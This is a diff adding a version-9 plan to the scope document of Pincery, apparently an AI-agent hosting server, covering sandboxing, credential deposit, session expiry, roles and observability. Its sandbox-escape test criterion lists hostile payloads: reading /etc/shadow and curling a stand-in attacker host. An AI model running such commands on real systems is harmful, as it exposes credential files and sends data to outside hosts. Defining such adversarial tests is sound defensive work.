@@ -616,3 +616,168 @@ None broken.
 - v5 AC-30 (smoke script): `scripts/smoke.sh` updated to invoke `pcy login` instead of `pcy bootstrap` and to assert `/openapi.json` responds 200. Legacy smoke assertions all continue to hold.
 - v6 AC-35 capability gate: unchanged. MCP tool dispatch goes through the same authenticated HTTP API as the CLI; capability decisions happen server-side as today.
 - v7 AC-39 / AC-40 (vault API + CLI): the credential endpoints gain `#[utoipa::path]` annotations; CLI commands are restructured under `pcy credential <verb>` (verbs are unchanged semantically); the legacy top-level `pcy credential` command tree remains accessible.
+
+## v9 — Solo-Founder Trust Gate (Security Truth, Credential Requests, Auth Model, UI Rebuild)
+
+### Problem
+
+A skeptical solo-founder CEO walked through v8.0 live. They flagged twelve blockers, grouped P0 / P1 / P2, that stop them from betting their company on the product. The common thread: **the security story is shipped as marketing, not as code.** README advertises `zerobox` and `greywall`; `src/runtime/sandbox.rs` runs `sh` directly on the host. The secrets story protects agent → tool but leaves human → vault wide open (an agent can echo a plaintext key into `assistant_message` and poison the event log). The auth/session model has no TTL, no revocation, no users, no RBAC. The UI is routing bones, not a product. No event-log search, export, cost reports, retention, or multi-tenant story.
+
+v9 is **the trust gate.** No further versions ship until every P0 is real code with a failing-adversary test, every P1 has a visible UI surface, and every P2 has a design doc or an explicit "deferred to v10." This is not a feature version — it is the version that makes everything already built defensible.
+
+### Smallest Useful Version
+
+A v9.0 release where: (a) the binary ships with **real** Linux sandboxing wired to `ProcessExecutor` or the sandbox claim is removed everywhere, (b) the **Credential Request** out-of-band deposit flow is live end-to-end (new table, tool, API, dedicated deposit UI), (c) session tokens have TTL + refresh + revocation + a users/roles table with at least `admin | operator | viewer`, and (d) a rebuilt UI surfaces the event-timeline, the budget burndown, and the credential-request inbox. P1 observability items (search, export, cost reports, retention) ship as v9.1. P2 items (multi-tenant, tool catalog, Ollama bullet, version handshake, terminology pass) ship as v9.2 or are explicitly deferred to v10.
+
+### Acceptance Criteria
+
+- **AC-53** (Sandbox Truth — kill the marketing lie): Exactly one of the following is true and asserted by test. **Option A**: every shell tool call on Linux runs inside a Bubblewrap + seccomp-bpf-based sandbox (the Zerobox primitive) that the `ProcessExecutor` invokes via a new `SandboxedExecutor`; an adversarial test `tests/sandbox_escape_test.rs` runs three payloads (`cat /etc/shadow`, `curl attacker.example.com`, `ls /host`) inside the sandbox and asserts all three fail. **Option B**: every occurrence of the words `zerobox`, `Zerobox`, `greywall`, `Greywall`, `sandbox`, and `isolation` in `README.md`, `preferences.md`, `DELIVERY.md`, the landing-page HTML, and the CLI `--help` output is replaced with the literal phrase `process-level hardening (not container isolation)`; a `tests/no_sandbox_lie_test.rs` grep-lint enforces this. The repository MUST NOT merge both paths simultaneously. Verified by the adversarial test *or* the lint test, selected by `SANDBOX_MODE=real|disabled` in scope.
+
+- **AC-54** (Security Threat Model): `docs/SECURITY.md` exists and is linked from `README.md`. It contains four sections with minimum content: **(1) Adversary capabilities** (what a malicious prompt / compromised LLM / compromised tool output can do), **(2) In-scope attacks** (at least: prompt-injection exfil, tool-sandbox escape, credential leak via event log, session hijack, webhook replay), **(3) Out-of-scope** (at least: compromised host, compromised Postgres, insider with DB credentials), **(4) Disclosure**: a working email address + PGP key fingerprint OR a GitHub Security Advisories link. A CI test `tests/security_doc_test.rs` asserts all four sections are present by regex.
+
+- **AC-55** (Credential Request Tool — agent asks for a secret out-of-band): A new migration creates `credential_requests (id uuid pk, agent_id uuid fk, name text, reason text, doc_url text nullable, status text, deposit_token text unique, deposit_token_expires_at timestamptz, created_at timestamptz, fulfilled_at timestamptz nullable, fulfilled_by uuid nullable)`. A new tool `request_credential(name, reason, doc_url?)` is registered in `src/runtime/tools.rs`; calling it inserts a row and emits a `credential_requested` event containing `{request_id, name, reason, doc_url}` — **never the deposit_token**, which stays server-only. A new API `POST /api/agents/:id/credential-requests` (for programmatic inspection) and `GET /api/credential-requests?status=pending` return request metadata. Verified by `tests/credential_request_tool_test.rs`: agent tool call inserts row + emits event; event payload contains `request_id` but no `deposit_token`; listing the pending requests via API returns the row.
+
+- **AC-56** (Credential Deposit Page — human deposits the secret, not the agent): Server renders an HTML page at `GET /deposit/:deposit_token` that shows `{name, reason, doc_url, agent_name}`, a single password-type input with `autocomplete="off"` + `name="value"`, and a submit button. `POST /deposit/:deposit_token` AEAD-encrypts the value with the existing vault key, inserts into `credentials` table, updates `credential_requests.status=fulfilled` and `fulfilled_at`, emits a `credential_deposited` event (name only, no plaintext, no ciphertext), and invalidates the deposit_token. The deposit_token is **single-use** and expires 24h after creation (configurable via `OPEN_PINCERY_DEPOSIT_TTL_HOURS`). Stale or already-used tokens render HTTP 410 Gone with a clear "this request has expired or already been fulfilled" message. Verified by `tests/credential_deposit_test.rs`: valid token → deposit works → event emitted → second POST returns 410; expired token returns 410.
+
+- **AC-57** (Credential Request CLI + UI Inbox): `pcy credential request list --output json` returns all pending requests for the workspace. `pcy credential request approve <request_id>` prints the deposit URL (operator then opens it in a browser). `pcy credential request reject <request_id> --reason "..."` closes the request with status=rejected and emits a `credential_request_rejected` event the agent can see on its next wake. The UI `/credentials/requests` view renders the pending-request list with a "Open deposit page" button per row. Verified by `tests/cli_credential_request_test.rs` exercising all three verbs against a live test DB.
+
+- **AC-58** (Session TTL + Refresh + Revocation): Sessions have a server-enforced TTL of 24h by default (configurable via `OPEN_PINCERY_SESSION_TTL_HOURS`). A new column `sessions.expires_at timestamptz not null` is added via migration and backfilled to `created_at + 24h`. Every authenticated request checks `expires_at > now()`; expired tokens return HTTP 401 with `{"error":"session_expired"}`. `POST /api/sessions/refresh` takes a valid session token and returns a new one with extended expiry. `POST /api/sessions/revoke` deletes the current session. `pcy session list --output json` returns `[{id, user_id, created_at, expires_at, last_used_at}]`; `pcy session revoke <id>` removes it. Verified by `tests/session_ttl_test.rs`: expired token returns 401; refresh extends TTL; revoke invalidates immediately.
+
+- **AC-59** (Users + Roles): A new migration creates `roles` enum `admin | operator | viewer` and adds `users.role text not null default 'admin'` (existing admin user backfilled to `admin`). New CLI: `pcy user add <email> --role operator`, `pcy user list`, `pcy user set-role <email> <role>`, `pcy user delete <email>`. Role enforcement: `admin` = all endpoints; `operator` = everything except user-management + role-change; `viewer` = `GET` endpoints only (no `POST`/`PATCH`/`DELETE`, no tool execution). Verified by `tests/rbac_test.rs`: each role exercised against each endpoint with correct allow/deny.
+
+- **AC-60** (Auth README Rewrite + Three-Box Diagram): `README.md` has a new "Authentication" section above Quickstart. It contains: a mermaid or ASCII three-box diagram (`Admin Seed → Bootstrap → Session Token`), a table defining each token's lifetime + source + purpose, and a worked example showing the three commands in order (`pcy login --bootstrap-token`, `pcy whoami`, `pcy session list`). The env var `OPEN_PINCERY_BOOTSTRAP_TOKEN` is renamed to `OPEN_PINCERY_ADMIN_SEED` with a deprecation alias honoured for one version; `scripts/smoke.sh` and docker-compose.yml are updated. Verified by `tests/readme_auth_section_test.rs` asserting the diagram block + the token table + the env var presence.
+
+- **AC-61** (UI Rebuild on a Design System): The static frontend migrates off hand-rolled hash-routing onto a single declared design system. `static/js/` is replaced with a vendored build of either HTMX + Pico.css (zero-build) or a Preact + Tailwind artifact (prebuilt, committed). The new UI ships six views minimum: **Login**, **Agents list**, **Agent detail** (identity, work list, budget, rotate secret), **Event timeline** (color-coded by event_type, tool_call rows expandable), **Budget burndown** (sparkline per agent), **Credential request inbox**. Dark mode toggle present. Verified by `tests/ui_smoke_test_v9.rs`: each route returns 200, the rendered HTML contains the view's primary h1 text, and `Content-Security-Policy` header is present.
+
+- **AC-62** (Event Log Search + Export): `GET /api/agents/:id/events` gains query params `q=<substring>` (ILIKE over `content`), `type=<event_type>`, `since=<event_id>`, `until=<event_id>`, `limit=<n ≤ 1000>`. `GET /api/agents/:id/events.jsonl` streams newline-delimited JSON with the same filters. `GET /api/agents/:id/events.csv` streams CSV with the same filters (columns: `id,created_at,event_type,source,content,tool_name,wake_id`). `pcy events <agent> --search "foo" --type tool_call --format jsonl > out.jsonl` plumbs the CLI. Verified by `tests/event_search_export_test.rs`: seed 200 events, filter by q returns correct subset, jsonl/csv round-trip preserves all rows.
+
+- **AC-63** (Cost Reports): New API `GET /api/agents/:id/cost?group_by=day|model|tool&since=<ts>&until=<ts>` returns `[{bucket, usd_total, call_count}]`. `pcy cost <agent> --group-by model --since 2026-01-01` renders a sortable table. A new `/costs` UI view renders the per-agent breakdown as a stacked bar chart per day. Verified by `tests/cost_report_test.rs`: seed `llm_calls` rows with known usd values, assert grouping math.
+
+- **AC-64** (Event Retention + Export-Then-Prune): A new background job (configurable via `OPEN_PINCERY_RETENTION_DAYS`, default `unlimited`) can prune events older than N days — but only after they are written to an append-only gzipped JSONL archive directory (`OPEN_PINCERY_ARCHIVE_DIR`). A CLI `pcy events archive --older-than 90d --dry-run` reports what would be archived; without `--dry-run` it performs the archive + prune transaction. The archive is **never** deleted by Pincery. Verified by `tests/event_retention_test.rs`: seed old events, run archive, assert rows deleted + archive file contains identical JSONL.
+
+- **AC-65** (Multi-Tenant Declaration): `DELIVERY.md` and `README.md` gain a bold "**Multi-Tenant Support**" section that either (a) declares "Pincery is single-tenant per deployment; running a SaaS requires one deployment per customer" with a link to a future v12 multi-tenant roadmap, OR (b) ships `workspace_memberships` enforcement on every API endpoint with `tests/multi_tenant_test.rs` asserting cross-workspace isolation for events, agents, credentials, and sessions. v9 picks (a) unless (b) is explicitly selected during DESIGN. Verified by `tests/multi_tenant_declaration_test.rs`: the section exists with the exact heading and at least one of the two contracts is fulfilled.
+
+- **AC-66** (Tool Catalog Expansion): In addition to `shell` and `list_credentials`, ship at least: `http_get(url, headers?)` (with per-agent allowlist from a new `agent_http_allowlist` table), `file_read(path)` (scoped to a per-agent writable tempdir, no host FS access), `db_query(connection_name, sql)` (uses a stored credential, read-only enforced by server-side regex). Each new tool has its own integration test asserting the scoping rule. Verified by `tests/tool_catalog_test.rs`: four tools present in the runtime's tool list, each has a passing scoping test.
+
+- **AC-67** (Workspace-Level Rate Limiting): A new config `OPEN_PINCERY_TOOL_CALLS_PER_MINUTE` (default 600) caps total tool calls across all agents in a workspace over a rolling 60-second window. Exceeding emits a `rate_limit_exceeded` event and delays (not fails) the tool call with a 1s backoff. Verified by `tests/workspace_rate_limit_test.rs`: seed 601 tool calls within a minute, assert the 601st is delayed and the event is emitted.
+
+- **AC-68** (Offline / Local LLM Story): `README.md` gains a bullet in the "Stack" section: "**Local LLM**: works out-of-the-box with Ollama by setting `OPEN_PINCERY_LLM_BASE_URL=http://host.docker.internal:11434/v1`. No cloud LLM required for self-hosted operation." A new test `tests/ollama_config_test.rs` (unit, no external deps) asserts the README contains the bullet and the config loader accepts the Ollama URL shape.
+
+- **AC-69** (Version Handshake): `pcy status` output is extended to include `server_version`, `cli_version`, and `compatible: bool`. A new API `GET /api/version` returns `{version, commit_sha, build_time}`. The CLI compares major.minor; mismatched minor versions print a stderr warning but proceed; mismatched major versions refuse with exit code 3. Verified by `tests/version_handshake_test.rs`: build a stubbed server with v0.8.x against a v0.9.x CLI and assert the warning; stub a v1.x server against a v0.x CLI and assert exit 3.
+
+- **AC-70** (Terminology Lock): The README's opening paragraph declares the canonical vocabulary: "A **pincer** is a single continuous AI agent. **Pincery** is the server + CLI that hosts them. `pcy` is the CLI binary." A new lint `tests/terminology_test.rs` asserts that in `README.md`, `DELIVERY.md`, and `docs/api.md`, the words `bot`, `assistant`, and `worker` are never used as synonyms for `pincer` (verified by regex with an explicit allowlist for unrelated contexts like "chatbot" in citations).
+
+### Stack
+
+No new core runtime dependencies beyond what's in v8. The following are added and pinned:
+
+| Concern                          | Choice                           | Why                                                             |
+| -------------------------------- | -------------------------------- | --------------------------------------------------------------- |
+| Linux sandboxing (AC-53 Option A) | `bubblewrap` (system binary) + seccomp-bpf profile | Mature, battle-tested (used by Flatpak), zero new Rust deps |
+| UI framework (AC-61)             | HTMX 1.9 + Pico.css              | Zero-build, ships as ~15KB; no npm pipeline to maintain         |
+| Retention archive format (AC-64) | gzipped JSONL, one file per day  | Trivially greppable, resumable, matches event-log schema        |
+| Session cookie signing (AC-58)   | Existing vault key (reused)      | No new key-management surface                                   |
+
+### Deployment Target
+
+Unchanged: single Rust binary + PostgreSQL + static assets. The only new operational surface is the **deposit page** served from the same HTTP listener at `/deposit/:token` — no separate service.
+
+### Data Model
+
+New tables:
+
+- `credential_requests (id, agent_id, name, reason, doc_url, status, deposit_token, deposit_token_expires_at, created_at, fulfilled_at, fulfilled_by)` — AC-55
+- `agent_http_allowlist (id, agent_id, host_pattern, created_at)` — AC-66
+
+New columns on existing tables:
+
+- `sessions.expires_at timestamptz not null` — AC-58
+- `sessions.last_used_at timestamptz` — AC-58
+- `users.role text not null default 'admin'` — AC-59
+
+New event types on `events.event_type`:
+
+- `credential_requested` (AC-55), `credential_deposited` (AC-56), `credential_request_rejected` (AC-57)
+- `rate_limit_exceeded` (AC-67)
+- `sandbox_blocked` (AC-53 Option A)
+
+No destructive schema changes. Every migration is forward-only and additive.
+
+### Estimated Cost
+
+$0 incremental — no new infrastructure required beyond what v8 already uses. The deposit page + retention archive live on the same Postgres + host filesystem.
+
+### Quality Tier
+
+**House** — production-facing trust gate. REVIEW and RECONCILE are mandatory on every AC. Every P0 AC (AC-53 through AC-61) requires an adversarial test, not just a happy-path test. v9 is the version that decides whether Pincery is a prototype or a product.
+
+### Clarifications Needed
+
+1. **AC-53 Option A vs Option B.** Wiring real Bubblewrap sandboxing is 1-2 weeks of engineering with adversarial testing; removing the marketing claim is a day. The solo founder's explicit ask is "don't release until all this is shipped" — interpreting that as Option A. If budget is tight, Option B + a "v10 will ship real sandboxing" commitment is defensible. **Default: Option A. Confirm before DESIGN begins.**
+2. **AC-61 UI stack.** HTMX + Pico is zero-build and ships today; Preact + Tailwind is more capable but adds a committed build artifact. **Default: HTMX + Pico** for the zero-build property. The UI rebuild ships six views; additional polish (animations, charts beyond sparklines) is v10.
+3. **AC-65 multi-tenant.** True multi-tenant enforcement touches every endpoint and is easily 2 weeks alone. **Default: ship the explicit single-tenant declaration (option a)** and sequence real multi-tenant as v12. The solo founder's use case is one deployment, one workspace — single-tenant is correct for now.
+4. **AC-59 roles granularity.** Three roles (admin/operator/viewer) is the SMB baseline. Adding custom roles / ABAC / scoped tokens is v11. Confirm three is enough.
+
+### Deferred to v10+
+
+- **SaaS control plane** (self-service signup, per-tenant billing, invite flows, password reset). v9 ships the RBAC primitive; the SaaS skin is v12.
+- **Prompt template editor UI.** Schema exists; v9 ships the event-timeline and credential-inbox views first. Template editor = v10.
+- **Real SSE/WebSocket event streaming** (AC-62 uses bounded polling). Pair with v11 signals primitive.
+- **Zerobox on macOS (Seatbelt) / Windows.** v9 AC-53 Option A is Linux-only. Cross-platform sandboxing = v12.
+- **Custom roles / ABAC.** v9 AC-59 ships fixed admin/operator/viewer. Custom roles = v11.
+- **MCP stdio server** (was deferred from v8.1). Pair with v11 signals.
+- **pgvector / CozoDB memory** (was v8+ north-star). v9 is security + trust gate only.
+
+### v9 Build Order
+
+The order is sequenced so each slice gates the next and every slice is independently committable + verifiable.
+
+**Phase A — Security Truth (P0, ~1-2 weeks)**
+
+1. **Slice A1 — AC-54 Threat Model + SECURITY.md**: writes the truth about what v8 actually protects. Ships first because every subsequent slice is scoped by this document. (1 day)
+2. **Slice A2 — AC-53 Sandbox Truth**: default Option A (real Bubblewrap + seccomp). Highest risk slice — may need to fall back to Option B if the adversarial test can't be stabilized in time. (3-5 days)
+3. **Slice A3 — AC-58 Session TTL + Refresh + Revocation**: no new features blocked by it — can ship parallel to A2. (1-2 days)
+4. **Slice A4 — AC-59 Users + Roles**: depends on A3's session machinery. (2-3 days)
+5. **Slice A5 — AC-60 Auth README Rewrite**: documentation commit. (½ day)
+
+**Phase B — Credential Requests (P0, ~1 week)**
+
+6. **Slice B1 — AC-55 Credential Request Tool + schema**: backend only; agent can emit requests, API can list them. (2 days)
+7. **Slice B2 — AC-56 Deposit Page**: HTML form + POST handler + single-use token. (1-2 days)
+8. **Slice B3 — AC-57 CLI + UI Inbox**: operator surfaces — depends on B1 + B2. (2 days)
+
+**Phase C — UI Rebuild (P1, ~1 week)**
+
+9. **Slice C1 — AC-61 UI Rebuild on HTMX + Pico**: six views, dark mode, CSP header. (3-5 days)
+
+**Phase D — Observability (P1, ~1 week)**
+
+10. **Slice D1 — AC-62 Event Search + Export**: query params + jsonl/csv streaming. (2 days)
+11. **Slice D2 — AC-63 Cost Reports**: grouping API + UI chart. (1-2 days)
+12. **Slice D3 — AC-64 Retention + Archive**: background job + CLI. (2 days)
+
+**Phase E — Multi-tenant + Tool Catalog + Polish (P2, ~1 week)**
+
+13. **Slice E1 — AC-65 Multi-Tenant Declaration**: doc commit selecting option (a). (½ day)
+14. **Slice E2 — AC-66 Tool Catalog Expansion**: http_get + file_read + db_query with scoping tests. (3 days)
+15. **Slice E3 — AC-67 Workspace Rate Limiting**: config + enforcement + event emission. (1 day)
+16. **Slice E4 — AC-68 Ollama Bullet**: README + test. (½ day)
+17. **Slice E5 — AC-69 Version Handshake**: `/api/version` + CLI mismatch warning. (1 day)
+18. **Slice E6 — AC-70 Terminology Lock**: README rewrite + lint test. (½ day)
+
+**Total estimate: 4-6 weeks of focused engineering at one-slice-per-day cadence.** No version ships before Phase A + B are complete (these are the trust gate). Phase C ships as v9.0. Phases D + E ship as v9.1 and v9.2 incrementally, each gated by its own REVIEW + VERIFY.
+
+### v9 Dependencies on Prior Versions
+
+None broken.
+
+- v1 AC-10 bootstrap primitive: **renamed** (`OPEN_PINCERY_BOOTSTRAP_TOKEN` → `OPEN_PINCERY_ADMIN_SEED`). Deprecation alias honoured for v9.0 with warning; removed in v10.
+- v7 AC-40 credential vault: **extended** — `credential_requests` table added; existing `credentials` table and API unchanged.
+- v8 AC-45 idempotent login: unchanged.
+- v8 AC-47 `--output`: every new list endpoint (requests, sessions, users, costs) honours the global `--output` flag.
+- v8 AC-52b CLI naming lint: new `credential request`, `session`, `user`, `cost` subcommands added to the lint allowlist.
+- v6 AC-36 `ProcessExecutor`: **wrapped** by `SandboxedExecutor` under AC-53 Option A; `tests/sandbox_test.rs` from v6 continues to pass.
+
+### Why v9 Is Worth a Whole Version
+
+A product that says "sandboxed" in marketing but runs `sh` is not a security product. A product where the agent can leak a secret into the event log is not a secrets product. A product where sessions never expire is not an auth product. v9 is the version that lets the solo founder look their CTO / their board / their first enterprise customer in the eye and say "yes, we sandbox; yes, secrets are isolated; yes, sessions rotate; yes, we have RBAC." Every AC above is a specific claim with a specific test. If any AC ships with placeholder behaviour, the version fails.
